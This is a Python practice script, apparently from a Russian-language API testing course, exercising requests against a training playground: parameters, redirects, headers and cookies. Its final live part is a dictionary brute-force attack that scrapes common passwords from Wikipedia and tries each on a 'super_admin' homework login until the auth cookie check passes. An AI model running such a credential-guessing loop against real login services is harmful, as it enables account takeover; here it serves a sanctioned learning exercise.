from json.decoder import JSONDecodeError
import requests

### Код первого запроса
### Передача параметра

# payload = {"name": "User"}
# response = requests.get("https://playground.learnqa.ru/api/hello", params=payload)
# print(response.text)


# response = requests.get("https://playground.learnqa.ru/api/hello", params={"name": "User"})
# parser_response_text = response.json()
# print(parser_response_text["answer"])

# response = requests.get("https://playground.learnqa.ru/api/get_text")
# print(response.text)
#
# try:
#     parser_response_text = response.json()
#     print(parser_response_text)
# except JSONDecodeError:
#     print("Responce is not a JSON format")

# response = requests.post("https://playground.learnqa.ru/api/check_type", params={"param1": "value1"})
# print(response.text)

# response = requests.post("https://playground.learnqa.ru/api/check_type", params={"param1": "value1"})
# print(response.status_code)

# response = requests.post("https://playground.learnqa.ru/api/get_500")
# print(response.status_code)
# print(response.text)

# response = requests.post("https://playground.learnqa.ru/api/somesing")
# print(response.status_code)
# print(response.text)

# response = requests.post("https://playground.learnqa.ru/api/get_301", allow_redirects=True)
# print(response.status_code)

# response = requests.post("https://playground.learnqa.ru/api/get_301", allow_redirects=True)
# first_response = response.history[0]
# second_response = response
# print(first_response.url)
# print(second_response.url)
# # print(response.text)


# headers = {"some_header": "123"}
# response = requests.post("https://playground.learnqa.ru/api/show_all_headers", headers=headers)
#
# print(response.text)
# print(response.headers)

### cookies

# payload = {"login": "secret_login", "password": "secret_pass"}
# response = requests.post("https://playground.learnqa.ru/api/get_auth_cookie", data=payload)
#
# print(response.text)
# print(response.status_code)
# print(dict(response.cookies))
# print(response.headers)

# payload = {"login": "secret_login", "password": "secret_pass"}
# response1 = requests.post("https://playground.learnqa.ru/api/get_auth_cookie", data=payload)
#
# cookie_value = response1.cookies.get('auth_cookie')
#
# cookies = {'auth_cookie': cookie_value}
#
# response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
#
# print(response2.text)

# задача с куками

import json
import requests
import time
import requests
from lxml import html

password_lst = []

# парсинг HTML код по XPath
response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
tree = html.fromstring(response.text)
locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[' \
          '@align="left"]/text() '
passwords = tree.xpath(locator)
for password in passwords:
    password_lst.append(str(password).strip())
# print(password_lst)


def unique(password_lst):
    output = []
    for x in password_lst:
        if x not in output:
            output.append(x)
    return output


request_body = {"login": "super_admin", "password": "passwordName"}
for pas in unique(password_lst):
    # print(pas)
    request_body["password"] = pas
    # print(request_body["password"])
    # print(request_body)
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=request_body)
    # print(response.cookies)
    cook = response.cookies.get("auth_cookie")
    # print(response.text)
    # print(response.status_code)
    cookies = {"auth_cookie": "cookieName"}
    cookies["auth_cookie"] = cook
    response = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if "You are NOT authorized" != response.text:
        print(f'password = {request_body["password"]}', response.text, sep="\n")

